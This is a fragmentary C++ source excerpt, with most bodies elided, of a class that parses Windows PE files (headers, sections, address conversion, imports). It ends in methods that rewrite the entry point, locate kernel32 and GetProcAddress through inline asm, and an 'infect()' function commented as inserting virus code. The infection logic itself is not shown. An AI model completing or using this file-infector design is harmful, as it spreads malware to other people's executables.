...
public:
	...
	static void __getBytes(char * _dst, size_t _len, long _offset_file, FILE *fp)	//获取从offset开始len长度的的字节到dst
	{
		int cnt = 0;
		if (fp == NULL)
		{
		...
		fseek(fp, _offset_file, 0);	//定位文件指针到offset
		while (_len--)
		{
			fscanf(fp, "%c", _dst++);
			cnt++;
	...
	static void __setBytes(char *_src, int _len, long _offset_file, FILE*fp)	//从src设置len长度的字节到offset
	{
		int cnt = 0;
		if (fp == NULL)
		{
...
public:
	tool() :fp(0), FILEPOINT(0), section_headers(0), number_of_section(0)
	{

	}

public:
	tool(char *filename) :fp(0), FILEPOINT(0), section_headers(0), number_of_section(0)
	{
	...
	LONG get_entry(FILE *fp = NULL)		//获取PE头入口地址
	{
		long rst = 0;
	...
	LONG get_Address_of_EntryPoint(FILE *fp = NULL)		//获取程序入口偏移地址
	{
		LONG rst = 0;
	...
	LONG get_Number_OF_Section(FILE * fp = NULL)	//获取节表数
	{
		WORD rst = 0;
	...
	IMAGE_DOS_HEADER get_IMAGE_DOS_HEADER(FILE *fp = NULL)	//获取DOS映像头
	{
	...
	_IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(FILE * fp = NULL)		//获取NT映像头
	{
		fp = (fp == NULL) ? this->fp : fp;
	...
	void get_IMAGE_SECTION_HEADERS(_IMAGE_SECTION_HEADER *_dst, size_t *_cnt, FILE *fp = NULL)	//获取PE文件节表头
	{
		fp = (fp == NULL) ? this->fp : fp;
	...
	unsigned int rva_To_fa(unsigned int rva)	//将相对虚拟地址转为文件偏移地址
	{
		unsigned int fa = 0;
	...
	unsigned int fa_To_rva(unsigned int fa)		//将文件偏移地址转换为相对虚拟地址。
	{
		unsigned int rva = 0;
	...
	unsigned int rva_to_va(unsigned int rva)		//将相对虚拟地址转换为虚拟地址。
	{
		_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER();
		return nth.OptionalHeader.ImageBase + rva;
	}

	unsigned int va_to_rva(unsigned int va)		//将虚拟地址转换为相对虚拟地址。
	{
		_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER();
		return va-nth.OptionalHeader.ImageBase ;
	}

	IMAGE_IMPORT_DESCRIPTOR* get_IMAGE_IMPORT_DESCRIPTORS(int *cnt=NULL)	//获取引入表描述符
	{
	...
	void change_AddressEntry(DWORD rva)		//改变程序入口地址
	{
		if (e_lfnew == 0)
		{
	...
	DWORD getKernal32Base()		//获取kernel32.dll基地址
	{
		DWORD rst;
		_asm
		{
	...
	DWORD getAddressOfGetProcAddre()	//获取GetProcAddress()函数入口地址
	{
		DWORD rst;
		DWORD pKernel32;
		_asm
	...
	int infect(FILE * fp=NULL )		//插入病毒代码
	{
		fp = (fp == NULL )? this->fp : fp;
